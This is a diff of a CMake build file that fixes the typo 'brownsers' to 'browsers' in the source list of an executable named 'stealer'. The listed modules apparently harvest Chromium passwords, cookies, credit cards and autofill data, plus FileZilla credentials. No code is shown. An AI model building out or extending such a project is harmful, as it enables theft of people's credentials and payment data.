@@ -68,24 +68,24 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/FileZilla.h
         src/utils/FilesUtil.cpp
         src/utils/FilesUtil.h
-        src/stealer/impl/brownsers/chromium/ChromiumBrowsers.cpp
-        src/stealer/impl/brownsers/chromium/ChromiumBrowsers.h
-        src/stealer/impl/brownsers/chromium/impl/CHistory.cpp
-        src/stealer/impl/brownsers/chromium/impl/CHistory.h
-        src/stealer/impl/brownsers/BrowserModule.h
-        src/stealer/impl/brownsers/chromium/impl/CCreditCards.cpp
-        src/stealer/impl/brownsers/chromium/impl/CCreditCards.h
-        src/stealer/impl/brownsers/chromium/impl/CDownloads.cpp
-        src/stealer/impl/brownsers/chromium/impl/CDownloads.h
-        src/stealer/impl/brownsers/chromium/impl/CPasswords.cpp
-        src/stealer/impl/brownsers/chromium/impl/CPasswords.h
-        src/stealer/impl/brownsers/chromium/ChromiumBrowserModule.h
-        src/stealer/impl/brownsers/chromium/impl/CBookmarks.cpp
-        src/stealer/impl/brownsers/chromium/impl/CBookmarks.h
-        src/stealer/impl/brownsers/chromium/impl/CAutoFill.cpp
-        src/stealer/impl/brownsers/chromium/impl/CAutoFill.h
-        src/stealer/impl/brownsers/chromium/impl/CCookies.cpp
-        src/stealer/impl/brownsers/chromium/impl/CCookies.h
+        src/stealer/impl/browsers/chromium/ChromiumBrowsers.cpp
+        src/stealer/impl/browsers/chromium/ChromiumBrowsers.h
+        src/stealer/impl/browsers/chromium/impl/CHistory.cpp
+        src/stealer/impl/browsers/chromium/impl/CHistory.h
+        src/stealer/impl/browsers/BrowserModule.h
+        src/stealer/impl/browsers/chromium/impl/CCreditCards.cpp
+        src/stealer/impl/browsers/chromium/impl/CCreditCards.h
+        src/stealer/impl/browsers/chromium/impl/CDownloads.cpp
+        src/stealer/impl/browsers/chromium/impl/CDownloads.h
+        src/stealer/impl/browsers/chromium/impl/CPasswords.cpp
+        src/stealer/impl/browsers/chromium/impl/CPasswords.h
+        src/stealer/impl/browsers/chromium/ChromiumBrowserModule.h
+        src/stealer/impl/browsers/chromium/impl/CBookmarks.cpp
+        src/stealer/impl/browsers/chromium/impl/CBookmarks.h
+        src/stealer/impl/browsers/chromium/impl/CAutoFill.cpp
+        src/stealer/impl/browsers/chromium/impl/CAutoFill.h
+        src/stealer/impl/browsers/chromium/impl/CCookies.cpp
+        src/stealer/impl/browsers/chromium/impl/CCookies.h
         include/binaryhandler.hpp
 )
 
